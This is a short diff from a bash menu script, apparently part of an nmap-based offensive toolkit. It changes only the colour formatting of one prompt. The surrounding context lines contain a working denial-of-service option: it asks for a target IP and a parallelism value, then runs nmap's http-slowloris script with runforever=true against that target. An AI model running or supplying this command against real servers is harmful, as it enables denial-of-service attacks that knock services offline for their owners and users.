@@ -699,7 +699,7 @@ elif [ $nnmap == $os_serv ]; then
 elif [ $nnmap == $dos_atk ]; then
 	echo -e -n "$BLUE [$GREEN+$BLUE] Nmap set to DOS attack, enter target : $RESETCOLOR"
 	read ip
-	echo -e -n "$BLUE [$GREEN+$BLUE] Select the value of the max parallelism (recommanded value : $RED 800) : $RESETCOLOR"
+	echo -e -n "$BLUE [$GREEN+$BLUE] Select the value of the max parallelism (recommanded value : $RED 800$BLUE ) : $RESETCOLOR"
 	read para
 	sudo nmap $ip -max-parallelism $para -Pn --script http-slowloris --script-args http-slowloris.runforever=true 
 	sleep 1
